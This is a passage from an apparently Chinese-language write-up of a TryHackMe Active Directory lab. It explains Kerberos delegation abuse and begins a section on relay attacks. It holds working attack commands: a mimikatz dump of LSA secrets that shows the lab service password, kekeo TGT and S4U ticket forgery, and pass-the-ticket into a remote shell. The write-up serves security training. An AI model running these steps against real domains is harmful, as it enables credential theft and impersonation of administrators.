允许将账户委派给主机上的<strong>所有活动</strong>。</li><li>MSSQL - 允许将用户账户委派给 SQL 服务，以进行数据库的<strong>直通式身份验证</strong>。</li></ul><p>利用约束性委派通常比利用非约束性委派更复杂，因为被委派的账户不能被用于访问所有东西。如果我们能拿到一个有约束性委派的 AD 账户的话。知道他的明文密码甚至他的 NTLM hash，我们能生成这个账户的 TGT。然后我们可以使用这个 TGT 来为<strong>任何非敏感的用户账户</strong>执行一个 TGS 请求，以便<strong>以该用户的身份</strong>访问服务。</p><p>整个过程简单说是这样的：</p><ul><li><strong>攻击者</strong>：掌握了<strong>服务账户</strong>的密码。</li><li><strong>攻击者</strong>利用这个服务账户的权限，<strong>伪造</strong>一个代表<strong>用户 A</strong>的票据。</li><li><strong>攻击者</strong>使用这个伪造的票据，去向 KDC 申请一个<strong>冒充用户 A</strong>访问<strong>服务 B</strong>的票据。</li></ul><h4 id="冒充过程（攻击流程）"><a href="#冒充过程（攻击流程）" class="headerlink" title="冒充过程（攻击流程）"></a>冒充过程（攻击流程）</h4><p>这个过程是利用了 Kerberos 的两个扩展协议：<code>S4U2self</code> 和 <code>S4U2proxy</code>。攻击者在拥有了配置了约束性委派的服务账户凭据（密码或 NTLM 哈希）后，可以执行以下步骤：</p><ol><li><p><strong>生成服务账户的 TGT</strong>： 攻击者首先使用窃取的服务账户的凭据（密码或 NTLM 哈希），向 KDC（密钥分发中心）请求一个该服务账户的 TGT。有了这个 TGT，攻击者就完全拥有了这个服务账户的身份。</p></li><li><p><strong>执行 S4U2self 请求（伪造身份）</strong>： 攻击者现在以被攻陷的<strong>服务账户</strong>的身份，向 KDC 发出请求。这个请求的目的是<strong>“代表”</strong>另一个<strong>用户 A</strong>（即你说的“非敏感用户账户”），向 KDC 请求一个服务票据（TGS），但这个 TGS 是用于访问<strong>自己（服务账户本身）</strong>的。KDC 看到这个请求后，会检查服务账户是否被<strong>信任</strong>用于委派（即是否设置了<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 标志）。如果设置了，KDC 会信任这个请求，并为<strong>用户 A</strong>生成一个有效的、可转发的 TGS。这个 TGS 相当于 KDC 认可的一个<strong>“用户 A 的身份凭证”</strong>。</p></li><li><p><strong>执行 S4U2proxy 请求（冒充访问）</strong>： 攻击者拿到上一步获得的<strong>“用户 A 的身份凭证”</strong>后，再次向 KDC 发出请求。这次的请求是希望以<strong>用户 A</strong>的身份，去访问一个<strong>被约束性委派允许访问的服务 B</strong>（例如，一个敏感数据库）。KDC 收到这个请求后，会进行严格的检查：</p><ul><li>检查该服务账户是否被允许代表用户去访问<strong>服务 B</strong>。</li><li>这个检查是通过查看服务账户的 <code>msDS-AllowedToDelegateTo</code> 属性中是否包含服务 B 的 SPN。</li></ul><p>如果检查通过，KDC 就会为攻击者（以服务账户的身份）颁发一个 TGS，这个 TGS 明确表示攻击者现在可以以<strong>用户 A</strong>的身份去访问<strong>服务 B</strong>。</p></li><li><p><strong>访问目标服务</strong>： 攻击者使用这个 TGS，就可以冒充<strong>用户 A</strong>，去访问敏感数据库，并执行用户 A 有权限的任何操作。</p></li></ol><h4 id="什么是非敏感的用户账户？"><a href="#什么是非敏感的用户账户？" class="headerlink" title="什么是非敏感的用户账户？"></a>什么是非敏感的用户账户？</h4><p>在 Kerberos 委派的上下文中，“非敏感用户账户”指的是<strong>没有被设置为拒绝委派的账户</strong>。</p><p>在 Active Directory 中，某些账户可以被标记为<strong>“敏感且不可委派”</strong>（<code>Account is sensitive and cannot be delegated</code>）或属于 <code>Protected Users</code> 组。</p><ul><li>如果一个账户被标记为敏感，或者属于 <code>Protected Users</code> 组，那么 KDC 会<strong>拒绝</strong>任何 S4U 请求，即不允许其他服务账户代表这个用户去访问任何其他服务。</li><li>攻击者通常会选择那些<strong>没有</strong>这些安全标记的普通用户账户进行冒充。虽然攻击者无法冒充域管理员，但他们可以冒充一个有权访问敏感数据库的普通用户，这同样能造成巨大的危害。</li></ul><h3 id="Resource-Based-Constrained-Delegation"><a href="#Resource-Based-Constrained-Delegation" class="headerlink" title="Resource-Based Constrained Delegation"></a>Resource-Based Constrained Delegation</h3><p>实际上，Kerberos 委派有三种类型。但这一种值得单独提出来说。<strong>基于资源的约束性委派（RBCD）</strong>由微软在 2012 年引入，它再次为 Kerberos 委派增加了额外的安全限制。</p><p>RBCD 彻底改变了委派模型。它不再是指定<strong>哪个对象</strong>可以委派给<strong>哪个服务</strong>，而是由<strong>服务本身</strong>来指定<strong>哪个对象</strong>可以委派给它。这使得服务所有者能够控制谁可以访问它。</p><p>在我们 Web 应用程序的例子中，这意味着我们不再需要在 Web 服务账户上指定它可以委派给数据库服务来访问数据库；而是可以在数据库服务上指定，允许 Web 服务账户委派访问它。</p><p>假设我们有权限为某个服务配置 RBCD。这意味着我们有能力为该服务的 AD 对象设置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性。我们可以用我们拥有的一个 AD 账户的详细信息来填充这个属性。为了现在获得对该服务的访问权限，我们可以为我们控制的账户生成一个 TGT，这将允许我们与该服务进行交互。如果你想看一个 RBCD 漏洞利用的详细例子，可以看<a href="https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/">这里</a>。</p><h3 id="三种委派的区别"><a href="#三种委派的区别" class="headerlink" title="三种委派的区别"></a>三种委派的区别</h3><p>这三种委派方式的主要区别在于<strong>谁拥有权限控制权</strong>，以及<strong>权限的范围有多大</strong>。</p><h4 id="非约束性委派-Unconstrained-Delegation"><a href="#非约束性委派-Unconstrained-Delegation" class="headerlink" title="非约束性委派 (Unconstrained Delegation)"></a>非约束性委派 (Unconstrained Delegation)</h4><ul><li><strong>控制权</strong>：权限控制权在<strong>服务账户</strong>本身。</li><li><strong>权限范围</strong>：<strong>无限制</strong>。</li><li><strong>工作原理</strong>：当用户访问一个配置了非约束性委派的服务器时，KDC 会将用户的 <strong>TGT (票据授权票据)</strong> 连同服务票据一起发送给服务器。服务器会将这个 TGT 存储在内存中。有了这个 TGT，服务器可以<strong>代表该用户</strong>去访问<strong>域中任何其他服务</strong>，没有任何限制。</li><li><strong>安全性</strong>：<strong>最不安全</strong>。一旦攻击者攻陷了这台服务器，他们就可以从内存中窃取所有用户的 TGT，从而完全冒充这些用户，包括域管理员。</li></ul><h4 id="约束性委派-Constrained-Delegation"><a href="#约束性委派-Constrained-Delegation" class="headerlink" title="约束性委派 (Constrained Delegation)"></a>约束性委派 (Constrained Delegation)</h4><ul><li><strong>控制权</strong>：权限控制权在<strong>服务账户</strong>。</li><li><strong>权限范围</strong>：<strong>有限制</strong>，但受限于服务账户本身。</li><li><strong>工作原理</strong>：管理员在 AD 中为<strong>服务账户</strong>配置一个列表，明确指定这个服务账户可以代表用户去访问<strong>哪些特定的服务</strong>（通过服务主名称 SPN 来指定）。当服务需要代表用户访问其他服务时，它会向 KDC 证明自己有代表用户的能力，然后 KDC 才会为它颁发一个专门用于访问指定服务的票据。</li><li><strong>安全性</strong>：比非约束性委派安全得多，因为它限制了服务可以访问的资源范围。即使服务账户被攻陷，攻击者也只能冒充用户去访问这个列表中指定的那些服务。</li></ul><h4 id="基于资源的约束性委派-Resource-Based-Constrained-Delegation-RBCD"><a href="#基于资源的约束性委派-Resource-Based-Constrained-Delegation-RBCD" class="headerlink" title="基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD)"></a>基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD)</h4><ul><li><strong>控制权</strong>：权限控制权在<strong>资源（或服务）所有者</strong>。</li><li><strong>权限范围</strong>：有限制，且限制在资源本身。</li><li><strong>工作原理</strong>：这种模式颠倒了控制逻辑。管理员不是在服务账户上配置它能访问哪些服务，而是在<strong>被访问的资源（例如 SQL 服务器）</strong>上配置一个列表，明确指定<strong>哪些服务账户</strong>被允许代表用户来访问它。</li><li><strong>安全性</strong>：<strong>最安全</strong>。这种模式将权限控制权下放给了资源所有者，他们可以更精细地控制谁可以访问他们的资源。这使得横向移动攻击更加困难，因为攻击者即使攻陷了某个服务账户，也不能随意冒充用户去访问未授权的资源。</li></ul><h4 id="总结表格"><a href="#总结表格" class="headerlink" title="总结表格"></a>总结表格</h4><table><thead><tr><th>特性</th><th>非约束性委派</th><th>约束性委派</th><th>基于资源的约束性委派 (RBCD)</th></tr></thead><tbody><tr><td><strong>控制权</strong></td><td>服务账户</td><td>服务账户</td><td><strong>资源账户</strong></td></tr><tr><td><strong>配置位置</strong></td><td>服务账户对象上</td><td>服务账户对象上</td><td><strong>资源（被访问服务）对象上</strong></td></tr><tr><td><strong>权限范围</strong></td><td>域内所有服务</td><td>指定的服务列表</td><td>允许访问资源的特定服务列表</td></tr><tr><td><strong>安全性</strong></td><td><strong>最低</strong></td><td>较高</td><td><strong>最高</strong></td></tr></tbody></table><h3 id="实践-3"><a href="#实践-3" class="headerlink" title="实践"></a>实践</h3><p>这个任务会利用受限制的委托完成，首先我们要做的是枚举可用的委托。让我们使用新的特权用户来执行网络命令。我们可以运行以下命令，使用 PowerSploit 的 Get-NetUser cmdlet 进行枚举：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> C:\Tools\PowerView.ps1 </span></span><span class="line"><span style="color: #56B6C2">Get-NetUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TrustedToAuth</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">logoncount               : </span><span style="color: #D19A66">39</span></span><span class="line"><span style="color: #ABB2BF">badpasswordtime          : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">distinguishedname        : CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">IIS Server,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Users,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">za,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">tryhackme,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">loc</span></span><span class="line"><span style="color: #ABB2BF">objectclass              : {top, person, organizationalPerson, user}</span></span><span class="line"><span style="color: #ABB2BF">displayname              : IIS Server</span></span><span class="line"><span style="color: #ABB2BF">lastlogontimestamp       : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">userprincipalname        : svcIIS</span><span style="color: #E06C75">@za.tryhackme.loc</span></span><span class="line"><span style="color: #ABB2BF">name                     : IIS Server</span></span><span class="line"><span style="color: #ABB2BF">objectsid                : S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">6155</span></span><span class="line"><span style="color: #ABB2BF">samaccountname           : svcIIS</span></span><span class="line"><span style="color: #ABB2BF">codepage                 : </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #ABB2BF">samaccounttype           : USER_OBJECT</span></span><span class="line"><span style="color: #ABB2BF">accountexpires           : NEVER</span></span><span class="line"><span style="color: #ABB2BF">countrycode              : </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #ABB2BF">whenchanged              : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">instancetype             : </span><span style="color: #D19A66">4</span></span><span class="line"><span style="color: #ABB2BF">usncreated               : </span><span style="color: #D19A66">78494</span></span><span class="line"><span style="color: #ABB2BF">objectguid               : 11e42287</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">0a25</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">4d73</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">800d</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">b62e2d2a2a4b</span></span><span class="line"><span style="color: #ABB2BF">sn                       : Server</span></span><span class="line"><span style="color: #ABB2BF">lastlogoff               : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">msds</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">allowedtodelegateto : {WSMAN</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc, WSMAN</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1, http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc,</span></span><span class="line"><span style="color: #ABB2BF">                           http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1}</span></span><span class="line"><span style="color: #ABB2BF">objectcategory           : CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Person,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Schema,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Configuration,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">tryhackme,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">loc</span></span><span class="line"><span style="color: #ABB2BF">dscorepropagationdata    : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">serviceprincipalname     : HTTP</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">svcServWeb.za.tryhackme.loc</span></span><span class="line"><span style="color: #ABB2BF">givenname                : IIS</span></span><span class="line"><span style="color: #ABB2BF">lastlogon                : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">43</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">56</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">badpwdcount              : </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #ABB2BF">cn                       : IIS Server</span></span><span class="line"><span style="color: #ABB2BF">useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION</span></span><span class="line"><span style="color: #ABB2BF">whencreated              : </span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">27</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">26</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">21</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">primarygroupid           : </span><span style="color: #D19A66">513</span></span><span class="line"><span style="color: #ABB2BF">pwdlastset               : </span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">29</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">25</span><span style="color: #ABB2BF"> AM</span></span><span class="line"><span style="color: #ABB2BF">usnchanged               : </span><span style="color: #D19A66">176228</span></span></code></pre></div></div></figure><p>从上面的输出（关注 <code>msds-allowedtodelegateto</code>）我们可以看到 svcIIS 账户可以在 THMSERVER1 上委派 HTTP 和 WSWAN 服务。你会认为这意味着我们只能代表冒充用户访问网站。但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。最理想的选择是冒充 Tier 1 管理员，因为这样我们就能获得 THMSERVER1 的管理访问权限。</p><p>如果你在 THMWRK1 上执行适当的后渗透枚举，你会发现主机上有一个以 <code>svcIIS</code> 用户身份运行的服务。由于我们现在拥有管理权限，因此我们可以利用这一点来转储 LSASecrets，这是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 运行 mimikatz</span></span><span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 提升到 SYSTEM 权限</span></span><span class="line"><span style="color: #ABB2BF">token::elevate</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 从注册表配置单元提取明文凭据</span></span><span class="line"><span style="color: #ABB2BF">lsadump::secrets</span></span><span class="line"><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #ABB2BF">Secret  : _SC_thmwinauth </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF"> service </span><span style="color: #98C379">&#39;thmwinauth&#39;</span><span style="color: #ABB2BF"> with username : svcIIS</span><span style="color: #E06C75">@za.tryhackme.loc</span></span><span class="line"><span style="color: #ABB2BF">cur</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">text: Password1@</span></span></code></pre></div></div></figure><p>现在有了 svcIIS 账户的密码，我们能用 <a href="https://github.com/gentilkiwi/kekeo">Kekeo</a> 和 <a href="https://github.com/gentilkiwi/mimikatz/security">Mimikatz</a> 组合实现 Kerberos Delegation 攻击，我们会用 Kekeo 生成 ticket 然后用 Mimikatz 去加载 ticket 进内存。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找一个受害者</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Tier 1 Admins&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># t1_eileen.burton</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行 kekeo</span></span><span class="line"><span style="color: #ABB2BF">C:\Tools\kekeo\x64\</span><span style="color: #56B6C2">kekeo.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个 svcIIS 的 TGT</span></span><span class="line"><span style="color: #ABB2BF">tgt::ask </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:svcIIS </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Password1@</span></span></code></pre></div></div></figure><p>现在我们有了可以执行委托的账户的 TGT，就可以为要冒充的账户伪造 TGS 请求了。我们需要对 HTTP 和 WSMAN 执行此操作，以便在 THMSERVER1 上创建 PSSession：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 以用户 t1_eileen.burton 的身份生成一个 HTTP TGS</span></span><span class="line"><span style="color: #ABB2BF">tgs::s4u </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">tgt:TGT_svcIIS</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC_krbtgt</span><span style="color: #ABB2BF">~za.tryhackme.loc</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC.kirbi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:t1_eileen.burton </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 以用户 t1_eileen.burton 的身份生成一个 WSMAN TGS</span></span><span class="line"><span style="color: #ABB2BF">tgs::s4u </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">tgt:TGT_svcIIS</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC_krbtgt</span><span style="color: #ABB2BF">~za.tryhackme.loc</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC.kirbi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:t1_eileen.burton </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:wsman</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc</span></span></code></pre></div></div></figure><p>现在用 mimikatz 导入这两个 TGS：</p><figure class="shiki PowerShell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div><div class="code"><pre><code># 打开 mimikatzC:\Tools\mimikatz_trunk\x64\mimikatz.exeprivilege::debug# 载入 TGSkerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbikerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbiexit# 使用 klist 查看载入的 TGSklistCurrent LogonId is 0:0x3bb224Cached Tickets: (2)#0>     Client: t1_eileen.burton @ ZA.TRYHACKME.LOC        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize        Start Time: 8/5/2025 7:07:51 (local)        End Time:   8/5/2025 17:07:48 (local)        Renew Time: 8/12/2025 7:07:48 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0        Kdc Called:#1>     Client: t1_eileen.burton @ ZA.TRYHACKME.LOC        Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize        Start Time: 8/5/2025 7:08:01 (local)        End Time:   8/5/2025 17:07:48 (local)        Renew Time: 8/12/2025 7:07:48 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0        Kdc Called:        # 进入 PSSessionEnter-PSSession -ComputerName thmserver1.za.tryhackme.loc</code></pre></div></div></figure><p>这下就有 THMSERVER1 的 Shell 了。</p><h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a href="https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/">What Is Kerberos Delegation? An Overview of Kerberos Delegation</a></p><h2 id="Exploiting-Relays"><a href="#Exploiting-Relays" class="headerlink" title="Exploiting Relays"></a>Exploiting Relays</h2><p>这个房间讲的就是利用 SMB 没用强制要求加密的漏洞，导致认证可以被截获。</p><p>Windows 主机都有一个<strong>机器账户</strong>。本质上，这是与该机器关联的用户账户。除非有人篡改过主机的账户，否则这些账户的密码是<strong>不可破解</strong>的。默认情况下，它们的密码长达 120 个字符（UTF16 编码），并每 30 天自动轮换一次。</p><p>在 AD 中，这些机器账户被大量用于不同的服务中。不同的<strong>域控制器</strong>使用它们的机器账户来同步 AD 的更新和更改。当你代表你正在工作的主机请求一个证书时，该主机的机器账户会被用于向 AD 证书服务进行身份验证。</p><p>在 AD 中有一个特殊情况，即一台机器对另一台机器拥有管理权限。本质上，在 AD 配置中，一台主机被授予了对另一台主机的管理权限。同样，这是预期的功能，例如必须进行同步的<strong>域控制器</strong>或 SQL 集群。然而，这些实例为<strong>强制认证</strong>提供了一个非常有趣的攻击途径。</p><p>使用以下的语法能在 BloodHound 中查询到这个途径：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p</span></span></code></pre></div></div></figure><p>这里我梳理一下，SERVER MANAGEMENT 组是 THMSERVER1 的管理员，然后 THMSERVER2 是 SERVER MANAGEMENT 组的一员，这就代表 THMSERVER2 对 THMSERVER1 有管理权限。</p><h3 id="打印机-Bug"><a href="#打印机-Bug" class="headerlink" title="打印机 Bug"></a>打印机 Bug</h3><p>这个打印机漏洞是 <strong>MS-RPRN 协议</strong>（打印系统远程协议）的一个“功能”，它允许一个域用户<strong>远程强制</strong>运行了 <strong>Print Spooler 服务</strong>的目标主机向一个<strong>任意的 IP 地址</strong>进行身份验证。</p><p>因此，要利用这一点，除了拥有机器账户的管理权限之外，我们还需要满足以下四个条件：</p><ol><li>一套有效的 <strong>AD 账户凭据</strong>。</li><li>与目标主机的 <strong>SMB 服务</strong>的网络连接。</li><li>目标主机必须运行 <strong>Print Spooler 服务</strong>。</li><li>主机必须<strong>没有强制启用 SMB 签名</strong>。</li></ol><p>我们要在对 THMSERVER2 没有访问权限的情况下确定 Print Spooler Service 是否在运行。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">GWMI Win32_Printer </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computer thmserver2.za.tryhackme.loc</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示 Access Denied 就用这个命令</span></span><span class="line"><span style="color: #56B6C2">Get-PrinterPort</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: 